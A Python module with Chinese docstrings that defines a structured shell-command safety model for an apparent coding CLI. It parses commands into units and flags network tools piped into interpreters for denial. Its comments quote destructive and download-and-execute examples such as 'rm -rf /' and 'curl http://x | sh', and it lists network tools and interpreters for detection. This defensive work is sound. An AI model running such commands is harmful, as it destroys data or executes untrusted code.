"""CommandPlan: 命令的结构化安全模型 (ADR-0013 §3 / §6).

规则引擎**不得**对原始命令串做子串匹配 —— `git status && rm -rf ~`,
`echo "$(rm -rf ~)"`, `bash -c 'rm -rf /'` 都能轻易绕过任何字符串规则. 裁决只能作用于
这里的结构.

两条容易搞混的口径:

- **分析单元不是执行单元.** 一条命令拆成多个 CommandUnit 只是为了分析; 通过之后仍以
  保持 Shell 语义的方式整条执行, 不会把管道拆成多次调用.
- **授权以整条 CommandPlan 为单位.** `cat a.txt | grep b && rm -rf /` 的第三个单元命中
  Hard Deny 时, 必须在启动**任何**子进程前拒绝整条命令, 不能先跑前两个.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from enum import Enum

from forgecli.domain.tool.hashing import digest, digest_text

__all__ = [
    "CommandPlan",
    "CommandUnit",
    "Connector",
    "ParseStatus",
    "Redirect",
    "RedirectKind",
    "ScriptPayload",
    "ShellKind",
    "UnitOrigin",
    "normalize_executable",
]

# 只有这两个后缀表示"同一个程序的 Windows 写法". `.bat`, `.cmd`, `.ps1` 不能剥 ——
# 它们是脚本, 后缀本身就是判定语言的依据.
_EXECUTABLE_SUFFIXES = frozenset({"exe", "com"})


def normalize_executable(executable: str) -> str:
    """查表用的可执行文件名: 取基名, 去掉 Windows 可执行后缀.

    **查表用它, 解析 PATH 与算身份仍然用原样写法.** `/bin/rm` 与 `rm` 对规则是同一个
    判据, 但不是同一个文件: 身份哈希必须绑定实际路径, 而删除, 提权这些判定必须认出
    带路径的写法, 否则 `/bin/rm -rf /` 就绕过了以命令名为键的每一张表.
    """
    name = executable.replace("\\", "/").rsplit("/", 1)[-1]
    stem, dot, suffix = name.rpartition(".")
    if dot and stem and suffix.lower() in _EXECUTABLE_SUFFIXES:
        return stem
    return name


class ShellKind(Enum):
    """Shell 方言. 请求必须携带明确方言, 或由执行环境选择受支持的默认值.

    不能把 Windows 命令按 POSIX 语法猜: `dir & del x` 里的 `&` 在 cmd 是命令分隔符,
    在 POSIX 是后台执行, 猜错的后果是漏掉一整条子命令.
    """

    POSIX = "posix"
    CMD = "cmd"
    POWERSHELL = "powershell"


class ParseStatus(Enum):
    """解析结果. 除 OK 外都不得自动 Allow (ADR-0013 §4)."""

    OK = "ok"
    UNSUPPORTED = "unsupported"  # 语法能认出来, 但本实现不支持
    PARSE_ERROR = "parse_error"  # 语法错误或结构不闭合
    OPAQUE = "opaque"  # 结构解析出来了, 但内容无法判定 (如运行期生成的代码)

    @property
    def complete(self) -> bool:
        return self is ParseStatus.OK


class Connector(Enum):
    """本单元与**前一个**单元之间的连接符.

    必须保留而不能只拆成列表: `curl x | sh` (把网络内容喂给 shell, Hard Deny) 与
    `curl x; sh` (两条无关命令) 的风险完全不同.
    """

    NONE = ""
    AND = "&&"
    OR = "||"
    SEMI = ";"
    PIPE = "|"
    PIPE_AMP = "|&"
    BACKGROUND = "&"
    NEWLINE = "\n"


class UnitOrigin(Enum):
    """这个单元是从哪一层解析出来的. 审批展示要能说清"被拦的是哪一层"."""

    TOP_LEVEL = "top_level"
    SUBSTITUTION = "substitution"  # $(...) 与反引号
    PROCESS_SUBSTITUTION = "process_substitution"  # <(...) >(...)
    SUBSHELL = "subshell"  # ( ... )
    WRAPPER_INNER = "wrapper_inner"  # sh -c / cmd /c / python -c 的内层
    SCRIPT_BLOCK = "script_block"  # PowerShell { ... }


class RedirectKind(Enum):
    INPUT = "input"
    OUTPUT = "output"
    APPEND = "append"
    HEREDOC = "heredoc"
    HERESTRING = "herestring"
    DUPLICATE = "duplicate"

    @property
    def writes(self) -> bool:
        return self in (RedirectKind.OUTPUT, RedirectKind.APPEND)


@dataclass(frozen=True)
class Redirect:
    kind: RedirectKind
    target: str
    fd: int | None = None


@dataclass(frozen=True)
class ScriptPayload:
    """被执行的脚本内容或入口 (ADR-0013 §7).

    heredoc, `-c` 内联代码和脚本文件在这里统一表达: 三者都属于 EXECUTE_SCRIPT, 不按
    具体测试框架分类 —— pytest, npm test 和 python3 test.py 都能调用任意项目代码,
    维护"测试命令白名单"是没有尽头的.
    """

    language: str
    source: str | None = None
    path: str | None = None
    origin: str = "inline"  # inline / heredoc / file / encoded

    @property
    def content_hash(self) -> str | None:
        return digest_text(self.source) if self.source is not None else None


@dataclass(frozen=True)
class CommandUnit:
    """一条简单命令."""

    executable: str
    argv: tuple[str, ...]
    connector: Connector = Connector.NONE
    origin: UnitOrigin = UnitOrigin.TOP_LEVEL
    redirects: tuple[Redirect, ...] = ()
    assignments: tuple[tuple[str, str], ...] = ()
    script: ScriptPayload | None = None
    depth: int = 0
    raw: str = ""
    # 该单元里出现过, 但无法静态判定的结构 (运行期变量目标, 动态求值等).
    opaque_reasons: tuple[str, ...] = ()

    @property
    def name(self) -> str:
        """查表名 (基名, 去掉 .exe). 以命令名为键的判定一律用它, 不用 executable."""
        return normalize_executable(self.executable)

    @property
    def write_targets(self) -> tuple[str, ...]:
        """重定向写入的目标. `> /etc/passwd` 是写, 不能因为命令名是 echo 就放过."""
        return tuple(
            redirect.target for redirect in self.redirects if redirect.kind.writes
        )

    @property
    def read_targets(self) -> tuple[str, ...]:
        return tuple(
            redirect.target
            for redirect in self.redirects
            if redirect.kind is RedirectKind.INPUT
        )

    @property
    def dynamic_execution(self) -> bool:
        return bool(self.opaque_reasons) or self.name in _DYNAMIC_EXECUTORS


_DYNAMIC_EXECUTORS = frozenset({"eval", "source", ".", "exec", "Invoke-Expression"})


@dataclass(frozen=True)
class CommandPlan:
    """一条命令的完整分析结果."""

    shell_kind: ShellKind
    raw_command: str
    parser_version: str
    units: tuple[CommandUnit, ...] = ()
    status: ParseStatus = ParseStatus.OK
    opaque_constructs: tuple[str, ...] = ()
    parse_error: str | None = None
    cwd: str = ""
    _hash: str = field(default="", compare=False)

    def __post_init__(self) -> None:
        object.__setattr__(
            self,
            "_hash",
            digest(
                {
                    "shell_kind": self.shell_kind,
                    "units": [
                        {
                            "executable": unit.executable,
                            "argv": unit.argv,
                            "connector": unit.connector,
                            "origin": unit.origin,
                            "redirects": unit.redirects,
                            "assignments": unit.assignments,
                            "script": unit.script,
                            "depth": unit.depth,
                        }
                        for unit in self.units
                    ],
                    "status": self.status,
                    "opaque_constructs": self.opaque_constructs,
                    "parser_version": self.parser_version,
                    "cwd": self.cwd,
                }
            ),
        )

    @property
    def command_hash(self) -> str:
        """规范化计划的哈希. 与原始字符串无关: 改个空格不该让缓存失效, 改个参数必须."""
        return self._hash

    @property
    def raw_hash(self) -> str:
        return digest_text(self.raw_command)

    @property
    def executables(self) -> tuple[str, ...]:
        return tuple(dict.fromkeys(unit.executable for unit in self.units))

    @property
    def scripts(self) -> tuple[ScriptPayload, ...]:
        return tuple(unit.script for unit in self.units if unit.script is not None)

    @property
    def write_targets(self) -> tuple[str, ...]:
        return tuple(
            dict.fromkeys(
                target for unit in self.units for target in unit.write_targets
            )
        )

    @property
    def read_targets(self) -> tuple[str, ...]:
        return tuple(
            dict.fromkeys(target for unit in self.units for target in unit.read_targets)
        )

    @property
    def has_dynamic_execution(self) -> bool:
        return any(unit.dynamic_execution for unit in self.units)

    @property
    def pipes_into_interpreter(self) -> bool:
        """是否存在"上一条的输出直接喂给解释器"这种形状.

        `curl http://x | sh` 是下载后直接执行的经典形态, 它在 Hard Deny 清单里; 判定
        依据是连接符加下游可执行文件, 不是命令串里有没有 "curl".
        """
        for previous, unit in zip(self.units, self.units[1:], strict=False):
            if unit.connector not in (Connector.PIPE, Connector.PIPE_AMP):
                continue
            if unit.name in _INTERPRETERS and previous.name in _NETWORK_TOOLS:
                return True
        return False


_INTERPRETERS = frozenset(
    {
        "sh",
        "bash",
        "zsh",
        "dash",
        "ksh",
        "python",
        "python2",
        "python3",
        "node",
        "ruby",
        "perl",
        "php",
        "pwsh",
        "powershell",
    }
)

_NETWORK_TOOLS = frozenset({"curl", "wget", "fetch", "Invoke-WebRequest", "iwr"})
